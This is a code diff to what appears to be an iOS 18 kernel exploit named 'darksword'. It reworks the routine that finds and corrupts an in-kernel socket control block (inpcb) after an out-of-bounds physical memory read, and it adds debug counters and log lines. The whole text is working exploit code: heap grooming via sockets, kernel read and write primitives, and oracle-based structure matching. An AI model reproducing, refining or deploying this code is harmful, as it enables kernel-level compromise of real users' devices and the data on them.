@@ -123,6 +123,7 @@ static pthread_t freeThread;
 static pthread_t writeThread;
 static int highestSuccessIdx = 0;
 static int successReadCount = 0;
+static uint64_t gNameHits = 0, gRejZero = 0, gRejGencnt = 0, gRejCsi = 0;
 static struct iovec iov;
 static char executablePath[PATH_MAX];
 static const char *executableName;
@@ -475,47 +476,41 @@ void kwrite_buf(uint64_t where, void *buf, size_t size) {
     }
 }
 
-// reverse memmem: search needle backward from the END of haystack window [0, haystack_len)
-static void *reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
-    if (needle_len == 0) return (void *)haystack;
-    if (haystack_len < needle_len) return NULL;
-    const unsigned char *h = (const unsigned char *)haystack;
-    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
-        if (memcmp(h + i, needle, needle_len) == 0) return (void *)(h + i);
-    }
-    return NULL;
-}
-
 int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                              void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
     if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
-    // ClearSword matching: the default icmp6_filter is NOT all-ones on iOS 18;
-    // inpcb + icmp6filt + 8 holds 0x0000ffffffffffff (filter low bits + inp6_cksum/hops).
-    // Locate it BEFORE the executableName oracle, derive the exact inpcb base.
-    uint64_t corruptedFilterMarker = 0x0000ffffffffffff;
+    // Reference (darksword-kexploit) matching: find the executableName oracle in
+    // the OOB window, align down to the 0x400-aligned inpcb base (kalloc.1024),
+    // and confirm a real inpcb via a nonzero field at icmp6filt+8.
     int si = 0; bool found = false; uint64_t pso = 0;
     void *hit;
     do {
         hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
         if (hit) {
-            uint64_t foundOff = (uint64_t)hit - (uint64_t)rBuf;
-            void *filterHit = reverse_memmem(rBuf, foundOff, &corruptedFilterMarker, sizeof(corruptedFilterMarker));
-            if (filterHit) {
-                uint64_t filterOff = (uint64_t)filterHit - (uint64_t)rBuf;
-                if (filterOff >= OFFSET_ICMP6FILT + 8) {
-                    pso = filterOff - (OFFSET_ICMP6FILT + 8);
-                    found = true;
-                    break;
-                }
+            gNameHits++;
+            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00ULL;
+            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) {
+                found = true;
+                break;
+            }
+            gRejZero++;
+            if ((gNameHits & 0x1FF) == 0) {
+                printf("[dbg] nameHits=%llu rejZero=%llu pso=0x%llx icmp6filt+8=0x%llx\n",
+                    gNameHits, gRejZero, pso,
+                    *(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8));
+                fflush(stdout);
             }
         }
         si += 0x400;
-    } while (hit && si < OOB_SIZE);
+    } while (hit == NULL && si < OOB_SIZE);
     if (!found) return -1;
 
     uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
-    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue)
+    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue) {
+        gRejGencnt++;
+        printf("[dbg] candidate rejected: tg==last 0x%llx (pso=0x%llx)\n", tg, pso);
         return -1;
+    }
 
     int csi = -1;
     for (int i = 0; i < [socketPorts count]; i++) {
@@ -523,7 +518,12 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
             csi = i; break;
         }
     }
-    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
+    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) {
+        gRejCsi++;
+        printf("[dbg] candidate rejected: csi=%d used=%d tg=0x%llx (pso=0x%llx)\n",
+            csi, [(NSMutableArray*)usedGc containsObject:@(tg)] ? 1 : 0, tg, pso);
+        return -1;
+    }
     [usedGc addObject:@(tg)];
 
     uint64_t inpListNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28);
@@ -1501,14 +1501,15 @@ bool run_darksword(void) {
                 pagesDone++;
                 if ((pagesDone & 0x1FF) == 0) {
                     double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
-                    printf("[exploit]   map %llu page %llu/0x%llx readOK=%d try=%d %.1fs\n",
-                        s, pagesDone, searchSize / PAGE_SIZE, successReadCount, highestSuccessIdx, mEl);
+                    printf("[exploit]   map %llu page %llu/0x%llx readOK=%d try=%d nameHits=%llu rej0=%llu %.1fs\n",
+                        s, pagesDone, searchSize / PAGE_SIZE, successReadCount, highestSuccessIdx,
+                        gNameHits, gRejZero, mEl);
                     fflush(stdout);
                 }
             }
             double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
-            printf("[exploit]   map %llu done: readOK=%d try=%d %.1fs\n",
-                s, successReadCount, highestSuccessIdx, mEl);
+            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu %.1fs\n",
+                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, mEl);
             fflush(stdout);
             mach_port_deallocate(mach_task_self(), memObj);
             if (ok) break;
